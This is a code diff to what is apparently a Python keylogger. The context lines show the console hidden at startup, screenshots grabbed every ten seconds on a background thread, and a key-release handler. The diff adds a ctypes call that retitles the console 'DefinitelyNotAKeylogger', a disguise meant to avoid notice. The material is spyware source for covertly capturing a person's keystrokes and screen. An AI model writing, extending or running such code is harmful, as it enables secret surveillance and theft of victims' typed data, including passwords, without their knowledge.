@@ -35,6 +35,21 @@ from datetime import datetime
 import time
 import threading
 from PIL import ImageGrab
+import ctypes
+import psutil
+
+def set_process_name(new_name):
+    ctypes.windll.kernel32.SetConsoleTitleW(new_name)
+
+    # Verify if the console title is set
+    current_process = psutil.Process()
+    print(f"Process name: {current_process.name()}, Console title: {new_name}")
+
+# def set_process_name(new_name):
+#     kernel32 = ctypes.windll.kernel32
+#     process_handle = kernel32.GetCurrentProcess()
+#     kernel32.SetConsoleTitleW(new_name)
+#     kernel32.CloseHandle(process_handle)
 
 def capture_screenshot():
     screenshot = ImageGrab.grab()
@@ -63,6 +78,7 @@ def on_release(key):
     
 if __name__ == "__main__":
     hide_console()
+    set_process_name("DefinitelyNotAKeylogger")
 
     screenshot_interval = 10  # Interval in seconds
     threading.Thread(target=screenshot_timer, args=(screenshot_interval,), daemon=True).start()
